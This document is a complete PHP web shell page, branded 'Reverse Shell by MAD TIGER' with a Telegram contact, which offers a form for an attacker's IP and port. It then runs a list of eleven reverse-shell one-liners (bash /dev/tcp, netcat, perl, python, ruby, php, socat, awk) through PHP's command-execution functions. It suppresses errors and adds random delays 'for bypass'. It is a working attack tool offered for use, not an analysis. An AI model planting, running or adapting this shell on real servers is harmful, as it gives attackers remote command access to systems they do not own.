<?php
// --- PHP REVERSE SHELL DASHBOARD ---
session_start();
set_time_limit(0);
ignore_user_abort(true);
error_reporting(0);

// Default values
$default_ip = "127.0.0.1";
$default_port = 4444;

// Load from session or fallback
$ip = $_SESSION['ip'] ?? $default_ip;
$port = $_SESSION['port'] ?? $default_port;

// Save IP and Port on form submit
if (isset($_POST['connect'])) {
    $_SESSION['ip'] = $_POST['ip'];
    $_SESSION['port'] = (int)$_POST['port'];
    header("Location: ?action=start");
    exit;
}

// Start connection
if (isset($_GET['action']) && $_GET['action'] === "start") {
    echo "<pre>";
    reverse_shell($ip, $port);
    echo "</pre>";
    exit;
}

// Logging traffic
function traffic_log($msg) {
    file_put_contents("traffic_log.txt", "[" . date("H:i:s") . "] $msg\n", FILE_APPEND);
}

// Reverse shell function
function reverse_shell($ip, $port) {
    traffic_log("Connecting to $ip:$port...");

    $payloads = [
        "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'",
        "bash -i >& /dev/tcp/$ip/$port 0>&1",
        "nc -e /bin/bash $ip $port",
        "nc $ip $port -e /bin/bash",
        "/bin/nc $ip $port -e /bin/bash",
        "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'",
        "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
        "ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'",
        "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "socat TCP:$ip:$port EXEC:'/bin/bash,bash -i'",
        "awk 'BEGIN {s = \"/inet/tcp/0/$ip/$port\"; while(42) { do{ printf \"shell> \" |& s; if((s |& getline c) <= 0) break; while ((c | getline) > 0) print |& s; close(c); } close(s); }}'",
    ];

    foreach ($payloads as $cmd) {
        traffic_log("Trying payload: $cmd");
        if (function_exists('system')) {
            @system($cmd);
        } elseif (function_exists('shell_exec')) {
            @shell_exec($cmd);
        } elseif (function_exists('exec')) {
            @exec($cmd);
        } elseif (function_exists('passthru')) {
            @passthru($cmd);
        }
        sleep(rand(1,3)); // Sleep random time for bypass
    }

    traffic_log("All connection attempts finished.");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>🔥 Reverse Shell by MAD TIGER  🔥</title>
<style>
body { font-family: monospace; background: #0e0e0e; color: #00ff00; }
.container { max-width: 500px; margin: 50px auto; background: #151515; padding: 20px; border-radius: 10px; box-shadow: 0 0 15px #00ff00; }
h1 { text-align: center; }
label { display: block; margin: 10px 0 5px; }
input[type="text"], input[type="number"] { width: 100%; padding: 10px; background: #000; border: 1px solid #00ff00; color: #00ff00; border-radius: 5px; }
button { width: 100%; padding: 10px; margin-top: 15px; background: #00ff00; border: none; color: #000; font-weight: bold; border-radius: 5px; cursor: pointer; }
button:hover { background: lime; }
.log { background: black; color: lime; margin-top: 20px; padding: 10px; height: 200px; overflow-y: scroll; font-size: 12px; border: 1px solid green; }
.footer { text-align: center; font-size: 12px; margin-top: 20px; color: #666; }
</style>
</head>
<body>

<div class="container">
<h1>🔌 Reverse Shell Connect</h1>

<form method="POST">
<label for="ip">Enter Your IP:</label>
<input type="text" id="ip" name="ip" placeholder="e.g., 192.168.1.10" value="<?= htmlspecialchars($ip) ?>" required>

<label for="port">Enter Port:</label>
<input type="number" id="port" name="port" placeholder="e.g., 4444" value="<?= htmlspecialchars($port) ?>" required>

<button type="submit" name="connect">🚀 Connect</button>
</form>

<div class="log">
<?php
if (file_exists('traffic_log.txt')) {
    echo nl2br(file_get_contents('traffic_log.txt'));
} else {
    echo "No logs yet...";
}
?>
</div>

<div class="footer">
Made by MAD TIGER  🚀 | Telegram @DevidLuice |  2025
</div>
</div>

</body>
</html>
